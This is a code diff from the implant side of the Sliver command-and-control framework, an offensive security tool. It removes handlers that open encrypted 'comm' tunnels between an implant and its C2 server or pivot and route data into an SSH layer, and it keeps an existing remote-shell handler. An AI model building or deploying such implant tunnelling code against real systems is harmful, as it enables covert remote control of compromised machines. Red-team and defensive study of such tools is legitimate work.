@@ -26,13 +26,11 @@ import (
 	"log"
 	// {{end}}
 
-	"github.com/bishopfox/sliver/protobuf/commonpb"
+	"github.com/golang/protobuf/proto"
+
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/bishopfox/sliver/sliver/comm"
 	"github.com/bishopfox/sliver/sliver/shell"
 	"github.com/bishopfox/sliver/sliver/transports"
-
-	"github.com/golang/protobuf/proto"
 )
 
 const (
@@ -45,9 +43,6 @@ var (
 
 		sliverpb.MsgTunnelData:  tunnelDataHandler,
 		sliverpb.MsgTunnelClose: tunnelCloseHandler,
-
-		sliverpb.MsgCommTunnelOpenReq: commTunnelHandler,
-		sliverpb.MsgCommTunnelData:    commTunnelDataHandler,
 	}
 
 	// TunnelID -> Sequence Number -> Data
@@ -225,70 +220,4 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	log.Printf("Started shell with tunnel ID %d", tunnel.ID)
 	// {{end}}
 
-}
-
-// commTunnelHandler - A special handler that receives a Tunnel ID (sent by the server or a pivot)
-// and gives this tunnel ID to the current active Transport. The latter passes it down to the Comm
-// system, which creates the tunnel and uses it as a net.Conn for speaking with the C2 server/pivot.
-func commTunnelHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
-	data := &sliverpb.CommTunnelOpenReq{}
-	proto.Unmarshal(envelope.Data, data)
-
-	// {{if .Config.Debug}}
-	log.Printf("[tunnel] Received Comm Tunnel request (ID %d)", data.TunnelID)
-	// {{end}}
-
-	// Create and start a Tunnel. It is already wired up to its transports.Connection.
-	tunnel := comm.NewTunnel(data.TunnelID, transports.Transports.Server.C2.Send)
-
-	// Private key used to decrypt server Comm data
-	key := transports.GetImplantPrivateKey()
-
-	// Comm setup. This is goes on in the background, because we need
-	// to end this handler, (otherwise it blocks and the tunnel will stay dry)
-	go comm.InitClient(tunnel, true, key)
-
-	muxResp, _ := proto.Marshal(&sliverpb.CommTunnelOpen{
-		Success:  true,
-		Response: &commonpb.Response{},
-	})
-	connection.Send <- &sliverpb.Envelope{
-		ID:   envelope.ID,
-		Data: muxResp,
-	}
-}
-
-// commTunnelDataHandler - Receives tunnel data over the implant's connection (in case the stack used is custom DNS/HTTPS),
-// and passes it down to the appropriate Comm tunnel. Will be written to its buffer, then consumed by the Comm's SSH layer.
-func commTunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
-	data := &sliverpb.CommTunnelData{}
-	proto.Unmarshal(envelope.Data, data)
-	tunnel := comm.Tunnels.Tunnel(data.TunnelID)
-	for {
-		switch {
-		case tunnel != nil:
-			tunnel.FromServer <- data
-			// {{if .Config.Debug}}
-			log.Printf("[tunnel] From server %d bytes", len(data.Data))
-			// {{end}}
-			return
-		default:
-			// {{if .Config.Debug}}
-			log.Printf("[tunnel] No tunnel found for ID %d (Seq: %d)", data.TunnelID, data.Sequence)
-			// {{end}}
-			time.Sleep(100 * time.Millisecond)
-			continue
-		}
-	}
-
-	// if tunnel != nil {
-	//         tunnel.FromServer <- data
-	//         // {{if .Config.Debug}}
-	//         log.Printf("[tunnel] From server %d bytes", len(data.Data))
-	//         // {{end}}
-	// } else {
-	//         // {{if .Config.Debug}}
-	//         log.Printf("Data for nil tunnel %d", data.TunnelID)
-	//         // {{end}}
-	// }
 }
